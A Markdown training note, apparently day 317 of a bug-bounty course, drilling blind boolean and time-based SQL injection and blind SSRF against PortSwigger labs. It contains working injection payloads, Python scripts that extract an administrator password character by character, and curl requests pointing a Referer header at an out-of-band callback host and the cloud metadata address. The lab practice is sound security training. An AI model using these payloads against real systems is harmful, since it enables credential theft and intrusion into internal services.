---
title: "Weak Area Reinforcement Day 2 — Blind Injection Techniques"
tags: [reinforcement, SQLi, blind, SSRF, OOB, time-based, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 317
related_topics:
  - Weak Area Reinforcement Day 1 (Day 316)
  - Web Exploitation (R-02)
  - Server-Side Attack Review (Day 185)
---

# Day 317 — Weak Area Reinforcement Day 2: Blind Injection Techniques

---

## Goals

Drill blind injection variants: time-based SQLi, boolean-based SQLi, blind SSRF OOB.
These require patience and systematic enumeration — they are often skipped
and therefore often missed in real bug bounty programmes.

**Time budget:** 3 hours.

---

## Part 1 — Blind Boolean SQLi

### Recon: Why Boolean Blind Works

```
The application returns a different response for TRUE vs FALSE conditions.
No data is returned directly — you infer values bit by bit from the response.

Vulnerable pseudocode:
  result = db.query("SELECT * FROM users WHERE id=" + user_input)
  if result:
      return "User found"
  else:
      return "Not found"

Injection:
  1' AND 1=1--    → "User found"  (TRUE)
  1' AND 1=2--    → "Not found"   (FALSE)
  1' AND SUBSTRING(password,1,1)='a'--  → enumerate character by character
```

### Exploit Lab

```bash
# PortSwigger: "Blind SQL injection with conditional responses"
# Target URL: https://LAB.web-security-academy.net/filter?category=INJECT

# Step 1: Confirm boolean blind
# TRUE:  ?category=Gifts' AND 1=1--
# FALSE: ?category=Gifts' AND 1=2--

# Step 2: Confirm users table exists
# ?category=Gifts' AND (SELECT 'x' FROM users LIMIT 1)='x'--

# Step 3: Confirm admin user exists
# ?category=Gifts' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--

# Step 4: Enumerate password length
# ?category=Gifts' AND (SELECT 'x' FROM users WHERE username='administrator'
#           AND LENGTH(password)>1)='x'--
# Keep incrementing until response changes → password length = N

# Step 5: Enumerate each character
# ?category=Gifts' AND SUBSTRING((SELECT password FROM users
#           WHERE username='administrator'),1,1)='a'--
# Automate with Burp Intruder or custom script

# Python automation skeleton
import requests, string

def check(payload):
    r = requests.get(f"https://LAB/filter?category={payload}")
    return "Welcome back" in r.text  # TRUE response marker

charset = string.ascii_lowercase + string.digits
password = ""
for pos in range(1, 21):
    for ch in charset:
        payload = (
            f"Gifts' AND SUBSTRING((SELECT password FROM users "
            f"WHERE username='administrator'),{pos},1)='{ch}'--"
        )
        if check(payload):
            password += ch
            print(f"[+] Position {pos}: {ch}  → {password}")
            break
print(f"[*] Password: {password}")
```

```
Lab completed: Y/N
Password extracted: ___
Time: ___ min
```

---

## Part 2 — Time-Based Blind SQLi

### Recon: Why Time-Based Works

```
When there is NO visible response difference for TRUE/FALSE,
use sleep() to turn the response time into a side-channel.

TRUE:  1' AND SLEEP(5)--            → response delayed 5 seconds
FALSE: 1' AND IF(1=2,SLEEP(5),0)--  → no delay

Database-specific:
  MySQL:      ' AND SLEEP(5)--
  PostgreSQL: '; SELECT pg_sleep(5)--
  MSSQL:      '; WAITFOR DELAY '0:0:5'--
  Oracle:     ' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1)--
```

### Exploit Lab

```bash
# PortSwigger: "Blind SQL injection with time delays and information retrieval"

# Confirm time-based blind
curl -s -o /dev/null -w "%{time_total}\n" \
  "https://LAB/filter?category=Gifts'; SELECT SLEEP(5)--"
# Expect ~5 seconds

# Enumerate using time delays
python3 - <<'EOF'
import requests, time, string

def check_delay(payload, threshold=4):
    start = time.time()
    requests.get(f"https://LAB/filter?category={payload}")
    return (time.time() - start) > threshold

password = ""
for pos in range(1, 21):
    for ch in string.ascii_lowercase + string.digits:
        payload = (
            f"Gifts'; SELECT CASE WHEN "
            f"(SUBSTRING(password,{pos},1)='{ch}') "
            f"THEN pg_sleep(5) ELSE pg_sleep(0) END "
            f"FROM users WHERE username='administrator'--"
        )
        if check_delay(payload):
            password += ch
            print(f"[+] Position {pos}: {ch}  → {password}")
            break
print(f"[*] Password: {password}")
EOF
```

```
Lab completed: Y/N
Time: ___ min
Observation: time-based is slower than boolean because each request requires
             waiting for the sleep — automation is essential
```

---

## Part 3 — Blind SSRF with OOB

### Recon: Why OOB SSRF Matters

```
Blind SSRF = server makes a request to your URL, but nothing comes back
             in the HTTP response to you.
OOB = Out-of-Band — you detect the request using a DNS/HTTP listener.

Tools for OOB detection:
  - Burp Collaborator (professional)
  - interactsh (open source: https://github.com/projectdiscovery/interactsh)
  - https://requestcatcher.com (quick test)
  - https://webhook.site
```

### Exploit Lab

```bash
# Start interactsh listener
interactsh-client

# PortSwigger: "Blind SSRF with out-of-band detection"
# Test Referer header — server fetches analytics URLs from Referer

curl -s -H "Referer: https://YOUR.oastify.com" \
  "https://LAB/product?productId=1"

# Check interactsh output for incoming DNS lookup to YOUR.oastify.com

# If confirmed — test for SSRF to internal services
curl -s -H "Referer: http://169.254.169.254/latest/meta-data/" \
  "https://LAB/product?productId=1"
# Does interactsh receive a request? Does any data appear?
```

```
OOB callback received: Y/N
DNS or HTTP?           ___
Blind SSRF confirmed:  Y/N
Internal service reached: Y/N
Data exfiltrated via OOB: Y/N
Time: ___ min
```

---

## Post-Drill Rating

```
Area                           | Before | After
-------------------------------|--------|-------
SQLi — blind boolean           |   /5   |  /5
SQLi — time-based              |   /5   |  /5
SSRF — blind / OOB             |   /5   |  /5

Key insight that changed my understanding of blind injection:
  ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q317.1, Q317.2 …).

---

## Navigation

← Previous: [Day 316 — Weak Area Reinforcement Day 1](DAY-0316-Weak-Area-Reinforcement-Day-01.md)
→ Next: [Day 318 — Weak Area Reinforcement Day 3](DAY-0318-Weak-Area-Reinforcement-Day-03.md)
